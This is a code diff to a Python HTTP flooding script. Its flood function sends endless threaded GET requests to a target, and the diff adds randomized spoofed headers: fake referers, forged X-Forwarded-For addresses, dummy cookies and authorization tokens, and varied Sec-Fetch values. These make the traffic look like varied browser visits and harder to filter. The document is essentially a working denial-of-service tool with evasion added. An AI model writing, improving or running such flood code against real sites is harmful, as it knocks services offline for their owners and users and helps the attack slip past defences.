@@ -32,13 +32,62 @@ def flood(base_url, threads, paths):
         "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
     ]
 
+    referers = [
+        "https://www.google.com/",
+        "https://www.bing.com/",
+        "https://facebook.com/",
+        "https://twitter.com/",
+        "https://t.co/",
+        "https://reddit.com/",
+        "http://192.168.0.1/",
+    ]
+
+    languages = ["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "zh-CN,zh;q=0.8", "ru-RU,ru;q=0.8"]
+
+    x_forwarded_for = [
+        "8.8.8.8",
+        "192.168.1.1",
+        f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+    ]
+
+    cookies = [
+        "sessionid=xyz123;",
+        "token=abc.def.ghi;",
+        "",
+    ]
+
+    auths = [
+        "Bearer fake.jwt.token",
+        "Basic dXNlcjpwYXNz",  # base64 "user:pass"
+        "",
+    ]
+
+    accept_headers = [
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+    ]
+
     def send_request():
         path_index = 0
         while True:
-            headers = {"User-Agent": random.choice(user_agents)}
+            headers = {
+                "User-Agent": random.choice(user_agents),
+                "Referer": random.choice(referers),
+                "X-Forwarded-For": random.choice(x_forwarded_for),
+                "Accept": random.choice(accept_headers),
+                "Accept-Language": random.choice(languages),
+                "Content-Type": "application/json",
+                "Cookie": random.choice(cookies),
+                "Authorization": random.choice(auths),
+                "Host": "yourdomain.com",
+                "Connection": random.choice(["keep-alive", "close"]),
+                "DNT": random.choice(["1", "0"]),
+                "Sec-Fetch-Site": random.choice(["same-origin", "cross-site", "none"]),
+                "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
+                "Sec-Fetch-Dest": random.choice(["document", "script", "empty"]),
+                "Upgrade-Insecure-Requests": "1",
+            }
             path = paths[path_index % len(paths)].strip().lstrip("/")  # clean path
-            random_hash = generate_random_string()
-            url = f"{base_url}/{path}?id={random_hash}"
+            url = f"{base_url}/{path}"
 
             try:
                 response = requests.get(url, headers=headers)
